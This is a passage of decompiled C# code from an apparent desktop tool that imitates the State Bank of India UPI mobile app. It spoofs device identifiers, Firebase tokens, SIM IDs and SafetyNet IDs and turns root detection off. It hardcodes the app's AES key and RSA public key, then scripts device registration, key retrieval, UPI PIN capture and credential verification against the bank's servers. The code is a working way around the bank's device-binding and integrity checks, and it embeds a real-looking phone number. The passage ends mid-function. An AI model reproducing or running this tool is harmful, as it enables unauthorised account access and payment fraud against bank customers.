		MD5 mD = MD5.Create();
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = mD.ComputeHash(Encoding.UTF8.GetBytes(inputString));
		byte[] array2 = array;
		foreach (byte b in array2)
		{
			string text = "X2";
			stringBuilder.Append(b.ToString(text));
		}
		return stringBuilder.ToString();
	}

	public string simidd()
	{
		string chars = "1234567890";
		string text = RandomString(10, chars);
		string text2 = "NASA";
		return md5(text + text2 + text).ToLower().Substring(0, 17);
	}

	public Image LoadImage(string strin_1)
	{
		using MemoryStream stream = new MemoryStream(Convert.FromBase64String(strin_1));
		return Image.FromStream(stream);
	}

	public static string smethod_0()
	{
		string[] array = new string[10];
		string text = "SM-J100H";
		array[0] = text;
		string text2 = "U900-Soul";
		array[1] = text2;
		string text3 = "SGH-N100";
		array[2] = text3;
		string text4 = "SGH-X510";
		array[3] = text4;
		string text5 = "GT-I9060";
		array[4] = text5;
		string text6 = "GT-I8262";
		array[5] = text6;
		string text7 = "SGH-Z170";
		array[6] = text7;
		string text8 = "SGH-T408";
		array[7] = text8;
		string text9 = "SGH-S300";
		array[8] = text9;
		string text10 = "SM-G925F";
		array[9] = text10;
		string_0 = array;
		random_0 = new Random();
		return string_0[random_0.Next(string_0.Length)];
	}

	public static string RandomString(int length, string chars)
	{
		return new string((from s in Enumerable.Repeat(chars, length)
			select s[random.Next(s.Length)]).ToArray());
	}

	internal static string RandomStrinAg(int int_28, string string_86)
	{
		char[] array = new char[int_28];
		Random random = new Random();
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = string_86[random.Next(string_86.Length)];
		}
		return new string(array);
	}

	public static string jsonData_Serial(string str, string what)
	{
		string text = "\0";
		string result = text;
		try
		{
			string text2 = "\"";
			string text3 = "\"";
			string text4 = str.Substring(str.IndexOf(text2 + what + text3, StringComparison.CurrentCultureIgnoreCase));
			string text5 = text4;
			string text6 = text4;
			string value = ":\"";
			text4 = text5.Substring(text6.IndexOf(value) + 2);
			string text7 = text4;
			string text8 = text4;
			string value2 = "\"";
			result = text7.Substring(0, text8.IndexOf(value2));
			return result;
		}
		catch
		{
			return result;
		}
	}

	internal bool _Request_Sbi1(string string_86, string string_87, string string_88, WebProxy webProxy_5, ref CookieContainer cookieContainer_2, bool bool_63, bool bool_64, int int_28, int int_29, ref string string_89, ref string string_90, ref WebException webException_1)
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_86);
			httpWebRequest.Timeout = int_28;
			httpWebRequest.ReadWriteTimeout = int_29;
			if (cookieContainer_2 == null)
			{
				cookieContainer_2 = new CookieContainer();
			}
			httpWebRequest.CookieContainer = cookieContainer_2;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
			string contentType = "application/json; charset=UTF-8";
			httpWebRequest.ContentType = contentType;
			string userAgent = "okhttp/4.10.0";
			httpWebRequest.UserAgent = userAgent;
			string accept = "*/*";
			httpWebRequest.Accept = accept;
			if (!string.IsNullOrEmpty(csrfRequestIdentifier))
			{
				WebHeaderCollection headers = httpWebRequest.Headers;
				string name = "csrfRequestIdentifier";
				headers.Add(name, csrfRequestIdentifier);
				if (!string.IsNullOrEmpty(string_88))
				{
					httpWebRequest.Referer = string_88;
				}
				if (!string.IsNullOrEmpty(string_87))
				{
					string method = "POST";
					httpWebRequest.Method = method;
					using StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream());
					streamWriter.Write(string_87);
				}
				else
				{
					string method2 = "GET";
					httpWebRequest.Method = method2;
				}
				using StreamReader streamReader = new StreamReader(((HttpWebResponse)httpWebRequest.GetResponse()).GetResponseStream());
				response = streamReader.ReadToEnd();
				string_89 = response;
				return true;
			}
		}
		catch (WebException ex)
		{
			string message = (webException_1 = ex).Message;
			string text = "\0";
			string text2 = text;
			HttpStatusCode httpStatusCode = HttpStatusCode.OK;
			string[] array = new string[7];
			string text3 = "<StatusCode>";
			array[0] = text3;
			array[1] = httpStatusCode.ToString();
			string text4 = "</StatusCode>\t<ErrorCode>";
			array[2] = text4;
			array[3] = message;
			string text5 = "</ErrorCode>\t<ResponseCode>";
			array[4] = text5;
			array[5] = text2;
			string text6 = "</ResponseCode>";
			array[6] = text6;
			string_90 = string.Concat(array);
		}
		return true;
	}

	private bool method_5(string url, string Data_, string Reffrell, ref WebProxy webProxy_2, ref CookieContainer cookieContainer_2, bool bool_2, bool bool_3, int int_2, int int_3, ref string response, ref string ErrorMSG, ref WebException webException_2)
	{
		//IL_01f8: Expected O, but got Unknown
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Expected O, but got Unknown
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		//IL_015e: Expected O, but got Unknown
		ErrorMSG = "";
		response = "";
		webException_2 = null;
		HttpResponseMessage val = null;
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
			HttpClientHandler val2 = new HttpClientHandler
			{
				Proxy = webProxy_2,
				UseProxy = (webProxy_2 != null),
				AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate),
				UseCookies = true
			};
			CookieContainer cookieContainer;
			if ((cookieContainer = cookieContainer_2) == null)
			{
				cookieContainer = new CookieContainer();
			}
			val2.CookieContainer = cookieContainer;
			HttpClientHandler val3 = val2;
			if (cookieContainer_2 == null)
			{
				cookieContainer_2 = val3.CookieContainer;
			}
			HttpClient val4 = new HttpClient((HttpMessageHandler)(object)val3);
			try
			{
				val4.Timeout = TimeSpan.FromMilliseconds((int_2 <= 0) ? 30000 : int_2);
				HttpRequestMessage val5 = new HttpRequestMessage(string.IsNullOrEmpty(Data_) ? HttpMethod.Get : HttpMethod.Post, url);
				val5.Headers.ExpectContinue = true;
				HttpHeaderValueCollection<ProductInfoHeaderValue> userAgent = val5.Headers.UserAgent;
				string text = "Dalvik/2.1.0 (Linux; U; Android 11; HD1911 Build/RKQ1.201022.002)";
				userAgent.ParseAdd(text);
				if (string.IsNullOrEmpty(bearer))
				{
					HttpRequestHeaders headers = val5.Headers;
					string text2 = "Authorization";
					string text3 = "Bearer ";
					((HttpHeaders)headers).TryAddWithoutValidation(text2, text3);
				}
				else
				{
					HttpRequestHeaders headers2 = val5.Headers;
					string text4 = "Authorization";
					((HttpHeaders)headers2).TryAddWithoutValidation(text4, bearer);
				}
				if (!string.IsNullOrEmpty(Data_))
				{
					Encoding uTF = Encoding.UTF8;
					string text5 = "application/json";
					val5.Content = (HttpContent)new StringContent(Data_, uTF, text5);
				}
				val = val4.SendAsync(val5).GetAwaiter().GetResult();
				string text6 = "";
				if (bool_3)
				{
					text6 = val.Content.ReadAsStringAsync().GetAwaiter().GetResult();
				}
				HttpResponseHeaders headers3 = val.Headers;
				string text7 = "X-Request-For";
				IEnumerable<string> source = default(IEnumerable<string>);
				if (((HttpHeaders)headers3).TryGetValues(text7, out source))
				{
					source.FirstOrDefault()?.Trim();
				}
				response = text6;
				return true;
			}
			finally
			{
				((IDisposable)val4).Dispose();
			}
		}
		catch (WebException ex)
		{
			ErrorMSG = (webException_2 = ex).Message;
			return false;
		}
		catch (HttpRequestException val6)
		{
			HttpRequestException val7 = val6;
			ErrorMSG = ((Exception)(object)val7).Message;
			return false;
		}
		catch (Exception ex2)
		{
			ErrorMSG = ex2.Message;
			return false;
		}
		finally
		{
			if (val != null)
			{
				val.Dispose();
			}
		}
	}

	internal bool _Request_Sbi(string string_86, string string_87, string string_88, WebProxy webProxy_5, ref CookieContainer cookieContainer_2, bool bool_63, bool bool_64, int int_28, int int_29, ref string string_89, ref string string_90, ref WebException webException_1)
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_86);
			httpWebRequest.Timeout = int_28;
			httpWebRequest.ReadWriteTimeout = int_29;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
			CurrentTimeMillis();
			string connection = "keepalive";
			httpWebRequest.Connection = connection;
			WebHeaderCollection headers = httpWebRequest.Headers;
			string name = "Accept-Encoding";
			string value = "gzip,deflate";
			headers.Set(name, value);
			string text = "https://upionline.sbi/oauth/token";
			if (string_86 == text)
			{
				string contentType = "application/x-www-form-urlencoded; charset=UTF-8";
				httpWebRequest.ContentType = contentType;
			}
			else
			{
				string contentType2 = "application/json; charset=utf-8";
				httpWebRequest.ContentType = contentType2;
			}
			string userAgent = "Dalvik/2.1.0 (Linux; U; Android 11; HD1911 Build/RKQ1.201022.002)";
			httpWebRequest.UserAgent = userAgent;
			ServicePointManager.Expect100Continue = true;
			if (!string.IsNullOrEmpty(bearer))
			{
				WebHeaderCollection headers2 = httpWebRequest.Headers;
				string name2 = "Authorization";
				headers2.Add(name2, bearer);
			}
			else
			{
				WebHeaderCollection headers3 = httpWebRequest.Headers;
				string name3 = "Authorization";
				string value2 = "Bearer ";
				headers3.Add(name3, value2);
			}
			if (!string.IsNullOrEmpty(string_87))
			{
				string method = "POST";
				httpWebRequest.Method = method;
				httpWebRequest.ContentLength = Encoding.UTF8.GetBytes(string_87).Length;
				using StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream());
				streamWriter.Write(string_87);
			}
			else
			{
				string method2 = "GET";
				httpWebRequest.Method = method2;
			}
			using StreamReader streamReader = new StreamReader(((HttpWebResponse)httpWebRequest.GetResponse()).GetResponseStream());
			response = streamReader.ReadToEnd();
			string_89 = response;
			return true;
		}
		catch (WebException ex)
		{
			string message = (webException_1 = ex).Message;
			string text2 = "";
			string[] array = new string[7];
			string text3 = "<StatusCode>";
			array[0] = text3;
			array[1] = HttpStatusCode.OK.ToString();
			string text4 = "</StatusCode>\t<ErrorCode>";
			array[2] = text4;
			array[3] = message;
			string text5 = "</ErrorCode>\t<ResponseCode>";
			array[4] = text5;
			array[5] = text2;
			string text6 = "</ResponseCode>";
			array[6] = text6;
			string_90 = string.Concat(array);
		}
		return true;
	}

	public static long CurrentTimeMillis()
	{
		return (long)(DateTime.UtcNow - Jan1st1970).TotalMilliseconds;
	}

	private void btnCopy_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(txtSms.Text);
	}

	public static string AESGCMEncryptToBase64(byte[] textBytes, byte[] key, byte[] nonce)
	{
		GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
		gcmBlockCipher.Init(forEncryption: true, new AeadParameters(new KeyParameter(key), 128, nonce));
		byte[] array = new byte[gcmBlockCipher.GetOutputSize(textBytes.Length)];
		gcmBlockCipher.DoFinal(array, gcmBlockCipher.ProcessBytes(textBytes, 0, textBytes.Length, array, 0));
		return Convert.ToBase64String(array);
	}

	public static byte[] SHA256withKey(string input, byte[] key)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(input);
		SHA256 sHA = SHA256.Create();
		sHA.TransformBlock(key, 0, key.Length, key, 0);
		sHA.TransformFinalBlock(bytes, 0, bytes.Length);
		return sHA.Hash;
	}

	private void btnNext_Click(object sender, EventArgs e)
	{
		pictureBox1.Visible = false;
		txtSms.Visible = false;
		label1.Visible = false;
		btnNext.Visible = false;
		btnCopy.Visible = false;
		method_14();
		string text = "https://upionline.sbi/upi/api/check_device_status";
		string_93 = text;
		string text2 = "{\"check_root_detection\":false,\"requestMsg\":\"msgidddddddd\",\"key_data\":{\"keyId\":\"16\"},\"pspId\":\"201\"}";
		this.text6 = text2;
		string text3 = "{\"appVersionCode\":0,\"deviceInfo\":{\"androidId\":\"047c4b14f7bc5b3f\",\"appGenId\":\"DB52A3D88DF54A13AD19328A5E9C380E\",\"appName\":\"com.sbi.upi\",\"appVersionCode\":\"228\",\"appVersionName\":\"2.3.45\",\"bluetoothMac\":\"NA\",\"capability\":\"5200000200010004000639292929292\",\"deviceId\":\"047c4b14f7bc5b3f\",\"deviceType\":\"MOB\",\"fcmToken\":\"Io2qNgq5G29D5ARvcv0JBc:APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-mhsUrAcVVrI7MfaNLRok8qQeHJvy8T5tWGzV58wCOanPI8NlfAkn\",\"geoCode\":\"19.0911 ,72.9208\",\"ip\":\"127.0.0.1\",\"location\":\"Mumbai\",\"mobileNo\":\"\",\"os\":\"Android11\",\"regId\":\"NA\",\"relayButton\":\"gQ75MtbopujDiyGZ/oONqRqq/sg\\u003d\",\"safetyNetId\":\"SBI239AB591680946F2BB8C432363E3E8F1\",\"selectedSimSlot\":0,\"simId\":\"77210885c3692751b\",\"smsSentTime\":\"\",\"wifiMac\":\"02:00:00:00:00:00\"},\"recoveryOptionFlag\":0,\"requestInfo\":{\"pspId\":\"201\",\"pspRefNo\":\"SBID8376CFE95654B7AAE0DAD689F89BD9A\"},\"root_beer_count\":0,\"smsSent\":true,\"updateFlag\":0}";
		string oldValue = "047c4b14f7bc5b3f";
		string text4 = text3.Replace(oldValue, androidid);
		string oldValue2 = "Io2qNgq5G29D5ARvcv0JBc:APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-mhsUrAcVVrI7MfaNLRok8qQeHJvy8T5tWGzV58wCOanPI8NlfAkn";
		string text5 = text4.Replace(oldValue2, fakeGcmToken);
		string oldValue3 = "77210885c3692751b";
		string text6 = text5.Replace(oldValue3, simid);
		string oldValue4 = "SBID8376CFE95654B7AAE0DAD689F89BD9A";
		string text7 = text6.Replace(oldValue4, getsafetyid());
		string oldValue5 = "DB52A3D88DF54A13AD19328A5E9C380E";
		string text8 = text7.Replace(oldValue5, sbiActGuiddd);
		string hex = "A6E969A6AFF28488FEB1B3B480BBD6D5C2E9A576357EC83D4633624E5698CD83";
		byte[] array = StringToByteArray(hex);
		string newValue = AESGCMEncrypt(text8, array, new byte[12]);
		string text9 = this.text6;
		string oldValue6 = "msgidddddddd";
		this.text6 = text9.Replace(oldValue6, newValue);
		int num = 0;
		while (true)
		{
			if (!_Request_Sbi(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, this.num, this.num, ref string_96, ref string_95, ref webException_0))
			{
				MessageBox.Show(string_96);
			}
			string str = string_96;
			string what = "resp";
			string_96 = jsonData_Serial(str, what);
			string_96 = AESGCMDecrypt(string_96, array, new byte[12]);
			string text10 = string_96;
			string value = "maskedAccountNumber";
			if (text10.Contains(value) || num > 5)
			{
				break;
			}
			Application.DoEvents();
			Thread.Sleep(1500);
			num++;
		}
		string text11 = string_96;
		string value2 = "We are currently facing some technical issues. We regret for the inconvenience caused";
		if (!text11.Contains(value2))
		{
			string text12 = string_96;
			string value3 = "accId";
			string text13 = text12.Substring(text12.IndexOf(value3) + 7);
			string text14 = text13;
			string text15 = text13;
			string value4 = ",";
			text13 = text14.Substring(0, text15.IndexOf(value4));
			string what2 = "maskedAccountNumber";
			jsonData_Serial(text12, what2);
			string what3 = "bankName";
			jsonData_Serial(text12, what3);
			string what4 = "accountType";
			jsonData_Serial(text12, what4);
			string what5 = "accountName";
			jsonData_Serial(text12, what5);
			string what6 = "virtualAddress";
			string text16 = jsonData_Serial(text12, what6);
			string text17 = string_96;
			string value5 = "maskedAccountNumber";
			if (text17.Contains(value5))
			{
				string text18 = "{\"key_data\":{\"keyId\":\"16\"},\"pspId\":\"201\",\"requestMsg\":\"51A693117DB34514007AAAEE01E1A7A65010874819FD8BAF84A41BED63C992E363168FF43350B5DA52C9222CA6D2BE2AAB8263F7B93B12F2978458080FC8C8A1DD0F2FBBDE1E4CF9D89988CDA30AC168EC075CB359E5EFBFA8240ACDDC1CB99014DFD855DB869094BCDDFF9770E5546F68FDF7BBE434AC4F964A81CC6FAA0C9F549FFA14D24971BF2FDFB9FDD84A082F63E75D73F536678034E1886F6C791506AE3B32E4DB49DBD2DDAABF0D2C2F2D39347C9BF187D38B5128D88DEA75A898297A4FFF0C1683B43E663C7736BC707F014A1C05C13ED6DF50FDFE7153339CEAB12DD68FD0883851EE2E3D0E9F77A21A48A80B33C647CE698601D41D49C0C3E3A7640BAA311483943B46CC2B56902FD9D47A2C497EE139B838F1D96FC16AA0AEE62828159BC68220A3D5DA3950D1E12770AF8DF5EBD4C4777250A5770D255744B0811D4510F4427160CF82B1B3B89EF161CD28EDB788924E10D93EE90082092A783F3A1E6500D0D86781E595DFA06CA961FE61E0A4BA80B4021E39F772EAB471FCE45945873295651C28C0CD3C481DE780D40DB0FAD70CC6260DF59F32F5F2FB1A83400BC54A1B549962A05DE3DBEDEAF727EF085C813349D7977DB2F715AA7585157F308CBBFAD6C2169086D336019A64F56E56FAE35D539AAB28D0D837350A1C0A2C2EADF776A0ED468C824C21C87B75C9636531D2CDB64C7C485F750D6E09597C9D81025AF187AFDF6D2AB57BE8E17FF49E70E856794B72084F0E963A46D78DEAFB0F95C2FE3984D8BEF763B1F4A7B760215524A672FF83B24C2B896AC323AEBA40DD5F28BD260994C786714451EF5A00B2323664AA197E1EBB9C2D7EDDE0D101BE6306241FBACFBA934590E8D92092494641F1D586A7496E89731B12C2F1F0770D3718DDE6934E999D6ABC7CD10074D44361458A906C0DFB0AD8D94F4DF4E252DFA7595540561F01827A1ACD7C2DB92AC5D5088B01BA24E8B6C2A1CF686DFEC7449F1F3B79B8157CC7FE6D0AE382D465165F76A963D15EBD597BB53DA74B8A80A5243B9106DDA2609E1FFF66D9F1A5973DC3B8A89DE81CB5C0DE27005F314EC83F2BDDAF503D19E6026204365B883A0138ADD6BDFBEA0F5B0411E78D6393EA51E33A9414572A93CF123ED6DB17CE07EC7651D0DF2B4C4450444AD9AC4B9AC7971C6C30F35733A31573AAD007BAC5A62EDB6114C9F6C180BD792E183B07A1D493DBA33730F8C59ACE49C718BE2B0E847E92573B6FE17DB0B91C76A1FB672739316DC26B1036E490796511778428D331CDCC87204C26EFFB62CB62A962D55011F8B157F6E9B788A036D8AB5E6803A7158E56D5D366EE7C894C69AE601821C22DD7518D15E27144526B47E4971A46F32C9F892F8CDBA67BB748CE102643D9905593064B6CC66E21E1915BB0A748ADDE3D24C7DF52000235F49162EE5DDE1BB3C654420C22B208EAA2232C9837A142B110D10A6B5E07EE853E39F9CBC85385294519CF4D0D12F28C96899FB71ABEF33A965D352777DFF7478BD072FF777904CBD0B4\",\"signature\":\"41B8A8DBF4152D1C9BF9863F63B9975E129272C6F95E5C6AA8521B61307E8640\"}";
				this.text6 = text18;
				string text19 = text13;
				string text20 = GetRandAesKey().ToLower();
				tokenSecondService = GetRandAesKey().ToLower();
				string[] array2 = new string[5] { text20, null, null, null, null };
				string text21 = "|";
				array2[1] = text21;
				array2[2] = tokenSecondService;
				string text22 = "|";
				array2[3] = text22;
				array2[4] = androidid;
				string newValue2 = RsaEncrypt(string.Concat(array2), ReadPublicKeyFromCrt());
				string[] array3 = new string[5] { androidid, null, null, null, null };
				string text23 = "|com.sbi.upi|91";
				array3[1] = text23;
				array3[2] = mobilenumber.Text;
				string text24 = "|2.3-v1.8|";
				array3[3] = text24;
				string[] array4 = new string[5] { text20, null, null, null, null };
				string text25 = "|";
				array4[1] = text25;
				array4[2] = tokenSecondService;
				string text26 = "|";
				array4[3] = text26;
				array4[4] = androidid;
				array3[4] = RsaEncrypt(string.Concat(array4), ReadPublicKeyFromCrt());
				string.Concat(array3);
				string text27 = "{\"credDataCode\":\"NPCI\",\"credDataKi\":\"20150822\",\"credDataValue\":\"0eb6a5ba728b5b89|com.sbi.upi|919140903684|2.3-v1.8|thjkjljljlj\",\"credSubType\":\"INITIAL\",\"credType\":\"CHALLENGE\",\"txnId\":\"SBIF24DC8112DD347C4B289AF0997847A97\",\"txnType\":\"GET_TOKEN\"}";
				this.text6 = text27;
				string text28 = this.text6;
				string oldValue7 = "thjkjljljlj";
				this.text6 = text28.Replace(oldValue7, newValue2);
				string text29 = this.text6;
				string oldValue8 = "9140903684";
				this.text6 = text29.Replace(oldValue8, mobilenumber.Text);
				string newValue3 = getsafetyid();
				string text30 = this.text6;
				string oldValue9 = "SBIF24DC8112DD347C4B289AF0997847A97";
				this.text6 = text30.Replace(oldValue9, newValue3);
				string text31 = this.text6;
				string oldValue10 = "0eb6a5ba728b5b89";
				this.text6 = text31.Replace(oldValue10, androidid);
				string text32 = "https://upionline.sbi/upi/listKeysService";
				string_93 = text32;
				if (!_Request_Sbi(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, this.num, this.num, ref string_96, ref string_95, ref webException_0))
				{
					MessageBox.Show(string_96);
				}
				string str2 = string_96;
				string what7 = "txnId";
				string text33 = jsonData_Serial(str2, what7);
				string str3 = string_96;
				string what8 = "reqMsgId";
				jsonData_Serial(str3, what8);
				string str4 = string_96;
				string what9 = "keyValue";
				jsonData_Serial(str4, what9);
				string prompt = "Enter UPI Pin";
				string title = "Express";
				string text34 = Interaction.InputBox(prompt, title);
				string text35 = text34;
				string text36 = "SBI";
				string text37 = Guid.NewGuid().ToString();
				string oldValue11 = "-";
				string text38 = text37.Replace(oldValue11, string.Empty).ToUpper().Substring(0, 31);
				string text39 = "7";
				text33 = text36 + text38 + text39;
				string text40 = mobilenumber.Text;
				string[] array5 = new string[7];
				string text41 = "0.00|";
				array5[0] = text41;
				array5[1] = text33;
				string text42 = "|||com.sbi.upi|";
				array5[2] = text42;
				array5[3] = text40;
				string text43 = "|";
				array5[4] = text43;
				array5[5] = androidid;
				string text44 = "|reqBalEnq";
				array5[6] = text44;
				string input = string.Concat(array5);
				byte[] array6 = new byte[16];
				rngCsp.GetBytes(array6);
				string text45 = AESGCMEncryptToBase64(SHA256withKey(input, array6), StringToByteArray(tokenSecondService), array6);
				string text46 = "|";
				string text47 = text45 + text46 + Convert.ToBase64String(array6);
				string[] array7 = new string[5] { text35, null, null, null, null };
				string text48 = "|";
				array7[1] = text48;
				array7[2] = text33;
				string text49 = "|";
				array7[3] = text49;
				array7[4] = text47;
				string input2 = string.Concat(array7);
				string s = "MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAuDbDFnrdaI0hCnl2CoAn70a9krjKAaQCgtJfiEv6yDGBTC8lPfxisb/U5NIAf7JRcM2oo2YGf09aavVmvXzv5xgm9SwucHzveCi4/j/JxGZP6VUorbqX3aJHbClUyS5RsNKlkBYKKpcZH6RTHmn91FDjsjdHjUsrQK7R0hT0XLL8v0wUdhCjy2adhUlewrRFCvISJ1/jIr7BkqwH9nv+6SXL0IzSJDSibSshBFcLIv3mYF0joY370/j9pGFQOsdEduELO+AbYh1hIGu5KKQwzY0/CgKaonOzRVK+pAHxLrZt9mprRKDWRk4q3SaDG2J7ZfvAgbic67X/4IzU7py0vQIBAw==";
				string text50 = RsaEncrypt(input2, PublicKeyFactory.CreateKey(Convert.FromBase64String(s)));
				Encoding uTF = Encoding.UTF8;
				string text51 = "2.3-v1.8|";
				string text52 = Convert.ToBase64String(uTF.GetBytes(text51 + text50));
				string oldValue12 = "=";
				string newValue4 = "\\u003d";
				string newValue5 = text52.Replace(oldValue12, newValue4);
				string text53 = "https://upionline.sbi/upi/api/verify_cust_credentials";
				string_93 = text53;
				string text54 = "{\"accountId\":\"193780768\",\"addInfo\":{\"addInfo10\":\"NA\",\"addInfo9\":\"NA\"},\"deviceInfo\":{\"androidId\":\"0eb6a5ba728b5b89\",\"appGenId\":\"EA378883DAEB498892E12E3A07A4AB91\",\"appName\":\"com.sbi.upi\",\"appVersionCode\":\"228\",\"appVersionName\":\"2.3.47\",\"bluetoothMac\":\"NA\",\"capability\":\"5200000200010004000639292929292\",\"deviceId\":\"0eb6a5ba728b5b89\",\"deviceType\":\"MOB\",\"fcmToken\":\"rWsWrlPQQ4RU5X7UXlKwZL:\",\"geoCode\":\"19.0911 ,72.9208\",\"ip\":\"127.0.0.1\",\"location\":\"Mumbai\",\"mobileNo\":\"919140903684\",\"os\":\"Android12\",\"regId\":\"NA\",\"relayButton\":\"gQ75MtbopujDiyGZ/oONqRqq/sg\\u003d\",\"safetyNetId\":\"SBI239AB591680946F2BB8C432363E3E8F1\",\"selectedSimSlot\":0,\"simId\":\"0f9a9d2bf0e85bfc3\",\"smsSentTime\":\"\",\"wifiMac\":\"02:00:00:00:00:00\"},\"mpinCred\":{\"atmCrdLength\":0,\"credentialDataCode\":\"NPCI\",\"credentialDataKi\":\"20150822\",\"credentialDataLength\":0,\"credentialDataValue\":\"credvaluereplace\",\"credentialSubType\":\"MPIN\",\"credentialType\":\"PIN\",\"otpCrdLength\":0},\"npciTransId\":\"SBIA9EE5DCBE61943D697B74F6FC0E21BB7\",\"requestInfo\":{\"pspId\":\"201\",\"pspRefNo\":\"SBI70E6946966D148C2806DCA793A13458F\"}}";
				string oldValue13 = "0eb6a5ba728b5b89";
				string text55 = text54.Replace(oldValue13, androidid);
				string oldValue14 = "SBIA9EE5DCBE61943D697B74F6FC0E21BB7";
				string text56 = text55.Replace(oldValue14, text33);
				string oldValue15 = "SBI70E6946966D148C2806DCA793A13458F";
				string text57 = text56.Replace(oldValue15, getsafetyid());
				string oldValue16 = "0f9a9d2bf0e85bfc3";
				string text58 = text57.Replace(oldValue16, simid);
				string oldValue17 = "rWsWrlPQQ4RU5X7UXlKwZL:";
				string text59 = text58.Replace(oldValue17, fakeGcmToken);
				string oldValue18 = "193780768";
				string text60 = text59.Replace(oldValue18, text19);
				string oldValue19 = "9140903684";
				string text61 = text60.Replace(oldValue19, mobilenumber.Text);
				string oldValue20 = "credvaluereplace";
				string text62 = text61.Replace(oldValue20, newValue5);
				string oldValue21 = "EA378883DAEB498892E12E3A07A4AB91";
				newValue = AESGCMEncrypt(text62.Replace(oldValue21, sbiActGuiddd), array, new byte[12]);
				string text63 = "{\"key_data\":{\"keyId\":\"16\"},\"pspId\":\"201\",\"requestMsg\":\"msgidd\"}";
				this.text6 = text63;
				string text64 = this.text6;
				string oldValue22 = "msgidd";
				this.text6 = text64.Replace(oldValue22, newValue);
				if (!_Request_Sbi(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, this.num, this.num, ref string_96, ref string_95, ref webException_0))
				{
					MessageBox.Show(string_96);
				}
				string str5 = string_96;
				string what10 = "resp";
				string_96 = jsonData_Serial(str5, what10);
				string_96 = AESGCMDecrypt(string_96, array, new byte[12]);
				string text65 = string_96;
				string value6 = "Customer Credentials verified successfully";
				if (text65.Contains(value6))
				{
					string str6 = string_96;
					string what11 = "servGenId";
					string newValue6 = jsonData_Serial(str6, what11);
					string text66 = "{\"appVersionCode\":0,\"deviceInfo\":{\"androidId\":\"047c4b14f7bc5b3f\",\"appGenId\":\"DB52A3D88DF54A13AD19328A5E9C380E\",\"appName\":\"com.sbi.upi\",\"appVersionCode\":\"228\",\"appVersionName\":\"2.3.47\",\"bluetoothMac\":\"NA\",\"capability\":\"5200000200010004000639292929292\",\"deviceId\":\"047c4b14f7bc5b3f\",\"deviceType\":\"MOB\",\"fcmToken\":\"Io2qNgq5G29D5ARvcv0JBc:APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-mhsUrAcVVrI7MfaNLRok8qQeHJvy8T5tWGzV58wCOanPI8NlfAkn\",\"geoCode\":\"19.0911 ,72.9208\",\"ip\":\"127.0.0.1\",\"location\":\"Mumbai\",\"mobileNo\":\"919140903684\",\"os\":\"Android13\",\"regId\":\"NA\",\"relayButton\":\"gQ75MtbopujDiyGZ/oONqRqq/sg\\u003d\",\"safetyNetId\":\"SBI239AB591680946F2BB8C432363E3E8F1\",\"selectedSimSlot\":0,\"simId\":\"77210885c3692751b\",\"smsSentTime\":\"\",\"wifiMac\":\"02:00:00:00:00:00\"},\"recoveryOptionFlag\":0,\"requestInfo\":{\"pspId\":\"201\",\"pspRefNo\":\"SBID8376CFE95654B7AAE0DAD689F89BD9A\"},\"root_beer_count\":0,\"smsSent\":false,\"updateFlag\":0}";
					string oldValue23 = "047c4b14f7bc5b3f";
					string text67 = text66.Replace(oldValue23, androidid);
					string oldValue24 = "Io2qNgq5G29D5ARvcv0JBc:APA91bFiKXGPoJECJ7tm_9KVBA2ioVU2WpXByphrhgdW_oB-OmD6vH7BLqWZJ1r8ewzfkbe5bw_DZAyu0wl1uaN-mhsUrAcVVrI7MfaNLRok8qQeHJvy8T5tWGzV58wCOanPI8NlfAkn";
					string text68 = text67.Replace(oldValue24, fakeGcmToken);
					string oldValue25 = "77210885c3692751b";
					string text69 = text68.Replace(oldValue25, simid);
					string oldValue26 = "9140903684";
					string text70 = text69.Replace(oldValue26, mobilenumber.Text);
					string oldValue27 = "SBID8376CFE95654B7AAE0DAD689F89BD9A";
					string text71 = text70.Replace(oldValue27, getsafetyid());
					string oldValue28 = "DB52A3D88DF54A13AD19328A5E9C380E";
					string text72 = text71.Replace(oldValue28, newValue6);
					string text73 = "{\"check_root_detection\":false,\"requestMsg\":\"msgidddddddd\",\"key_data\":{\"keyId\":\"16\"},\"pspId\":\"201\"}";
					this.text6 = text73;
